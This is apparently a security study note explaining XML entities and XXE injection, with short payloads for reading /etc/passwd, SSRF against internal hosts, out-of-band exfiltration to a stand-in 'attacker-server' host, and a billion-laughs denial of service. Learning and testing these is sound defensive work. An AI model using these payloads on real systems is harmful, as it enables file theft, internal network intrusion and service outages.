>[!info]
>- Allows an attacker to interfere with an application's processing of XML data.
>- It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.
----
## XML Entities

>[!question] What is XML?
>- `XML` stands for "extensible markup language".
>- `XML` is a language designed for storing and transporting data.
>- `XML` uses a tree-like structure of tags and data.
>- Unlike `HTML`, `XML` does not use predefined tags. 

>[!question] What are XML entities?
>- `XML` entities are a way of representing an item of data within an `XML` document, instead of using the data itself.
>- Various entities are built in to the specification of the `XML` language.

>[!question] What is document type definition?
>- The `document type definition (DTD)` contains declarations that can define the structure of an XML document, the types of data values it can contain, and other items.
>- The `DTD` is declared within the optional `DOCTYPE` element at the start of the `XML` document.
>- The `DTD` can be fully self-contained within the document itself (`Internal DTD`) or can be loaded from elsewhere (`External DTD`) or can be hybrid of the two.
----
>[!info] Main XML Entities
>
>>[!example] Predefined Entities  
>>These are built-in entities in `XML` that represent special characters:
>>- `&lt;` --> Represents the `<` character.
>>- `&gt;` --> Represents the `>` character.
>>- `&amp;` --> Represents the `&` character.
>>- `&apos;` --> Represents the `'` character.
>>- `&quot;` --> Represents the `"` character.
>
>>[!example] Custom Entities
>>These are user-defined entities declared in the `Document Type Definition (DTD)`:
>>```xml
>><!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>
>>```
>>This definition means that any usage of the entity reference `&myentity;` within the `XML` document will be replaced with the defined value: "`my entity value`".
>
>>[!example] External Entities
>>`XML` external entities are a type of custom entity whose definition is located outside of the `DTD` where they are declared.
>>The declaration of an external entity uses the `SYSTEM` keyword and must specify a `URL` or file from which the value of the entity should be loaded:
>>```xml
>><!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>
>>```
>>```xml
>><!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>
>>```
>
>>[!example] Parameter Entities
>>These are used exclusively within `DTDs` and are prefixed with a `%`:
>>```xml
>><!ENTITY % paramEntity "This is a parameter entity">
>>```
>
>>[!example] General Entities
>>These are the most common type of entities and are referenced in the `XML` document body:
>>```xml
>><!ENTITY generalEntity "This is a general entity">
>>```
>
>>[!example] Internal Entities
>>These entities are defined within the `DTD` and do not reference external resources:
>>```xml
>><!ENTITY internalEntity "This is an internal entity">
>>```
----
>[!warning] How do XXE vulnerabilities arise?
>- Some applications use the `XML` format to transmit data between the browser and the server.
>- Applications that do this virtually always use a standard library or platform `API` to process the `XML` data on the server.
>- `XXE` vulnerabilities arise because the `XML` specification contains various potentially dangerous features, and standard parsers support these features even if they are not normally used by the application.

>[!bug] XXE-Specific Entities
>
>>[!danger] File Retrieval
>>To perform an `XXE injection` that retrieves an arbitrary file from the server's filesystem, you need to modify the submitted `XML` in two ways:
>>- Introduce (or edit) a `DOCTYPE` element that defines an external entity containing the path to the file.
>>- Edit a data value in the XML that is returned in the application's response, to make use of the defined external entity.
>>```xml
>><?xml version="1.0" encoding="UTF-8"?>
>><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
>><stockCheck><productId>&xxe;</productId></stockCheck>
>>```
>>
>>>[!tip]
>>>- With real-world `XXE` vulnerabilities, there will often be a large number of data values within the submitted XML, any one of which might be used within the application's response.
>>>- To test systematically for `XXE` vulnerabilities, you will generally need to test each data node in the `XML` individually, by making use of your defined entity and seeing whether it appears within the response.
>
>>[!danger] Server-Side Request Forgery
>>Server-side application can be induced to make `HTTP` requests to any `URL` that the server can access.
>>- Define an external `XML` entity using the `URL` that you want to target, and use the defined entity within a data value.
>>- If you can use the defined entity within a data value that is returned in the application's response, then you will be able to view the response from the `URL` within the application's response, and so gain two-way interaction with the back-end system.
>>- If not, then you will only be able to perform blind `SSRF` attacks.
>>```xml
>><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
>>```
>
>>[!danger] Out-of-Band Data Exfiltration
>>Using external entities to exfiltrate data to an external server:
>>```xml
>><!ENTITY % payload SYSTEM "file:///etc/passwd">
>><!ENTITY % oob "<!ENTITY &#x25; exfil SYSTEM 'http://attacker-server/?data=%payload;'>">
>>```
>
>>[!danger] Denial of Service
>>Exploiting entities to cause resource exhaustion:
>>```xml
>><!ENTITY lol "lol">
>><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
>><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
>>```
----